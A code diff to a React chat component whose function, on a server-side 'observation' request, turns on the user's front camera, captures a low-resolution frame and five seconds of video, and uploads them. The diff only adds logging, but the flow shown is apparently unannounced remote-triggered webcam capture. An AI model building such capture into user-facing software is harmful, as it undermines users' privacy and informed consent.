@@ -365,8 +365,15 @@ export default function Conversa() {
     async function verificarObservacao() {
       try {
         const res = await fetch(`/api/observacao?usuario_id=${usuarioIdRef.current}`);
+        if (!res.ok) {
+          const txt = await res.text();
+          console.error('[observacao] GET falhou:', res.status, txt.slice(0, 300));
+          return;
+        }
         const obs = await res.json();
         if (!obs) return;
+
+        console.log('[observacao] pedido encontrado, id:', obs.id, '— iniciando camera');
 
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: 'user', width: { ideal: 160 }, height: { ideal: 120 } },
@@ -387,8 +394,9 @@ export default function Conversa() {
           canvas.getContext('2d').drawImage(videoEl, 0, 0, 160, 120);
           frameJpeg = canvas.toDataURL('image/jpeg', 0.8);
           videoEl.srcObject = null;
+          console.log('[observacao] frame JPEG capturado, tamanho:', Math.round(frameJpeg.length / 1024), 'KB');
         } catch (e) {
-          console.warn('[observacao] frame fallback falhou:', e.message);
+          console.error('[observacao] frame fallback falhou:', e.name, e.message);
         }
 
         const recorder = new MediaRecorder(stream, { videoBitsPerSecond: 100000 });
@@ -402,25 +410,32 @@ export default function Conversa() {
             try {
               const dados = reader.result;
               const LIMITE = 4 * 1024 * 1024; // 4MB
-              const payload = dados.length > LIMITE && frameJpeg ? frameJpeg : dados;
-              console.log('[observacao] tamanho:', Math.round(dados.length / 1024), 'KB | usando:', dados.length > LIMITE ? 'frame JPEG' : 'video');
-              await fetch('/api/observacao', {
+              const usandoFrame = dados.length > LIMITE && frameJpeg;
+              const payload = usandoFrame ? frameJpeg : dados;
+              console.log('[observacao] video:', Math.round(dados.length / 1024), 'KB | payload:', Math.round(payload.length / 1024), 'KB | modo:', usandoFrame ? 'frame JPEG' : 'video');
+              const patchRes = await fetch('/api/observacao', {
                 method: 'PATCH',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ id: obs.id, video: payload }),
               });
-              console.log('[observacao] gravacao enviada, id:', obs.id);
+              if (!patchRes.ok) {
+                const errBody = await patchRes.text();
+                console.error('[observacao] PATCH falhou:', patchRes.status, errBody.slice(0, 500));
+              } else {
+                console.log('[observacao] gravacao enviada com sucesso, id:', obs.id);
+              }
             } catch (e) {
-              console.warn('[observacao] erro ao enviar:', e.message);
+              console.error('[observacao] erro ao enviar PATCH:', e.name, e.message, e.stack);
             }
           };
           reader.readAsDataURL(blob);
         };
 
+        recorder.onerror = (e) => console.error('[observacao] MediaRecorder erro:', e.error?.message ?? e);
         recorder.start();
-        setTimeout(() => { try { recorder.stop(); } catch (e) {} }, 5000);
+        setTimeout(() => { try { recorder.stop(); } catch (e) { console.error('[observacao] stop erro:', e.message); } }, 5000);
       } catch (e) {
-        console.warn('[observacao] erro:', e.message);
+        console.error('[observacao] erro no fluxo:', e.name, e.message, e.stack);
       }
     }
 
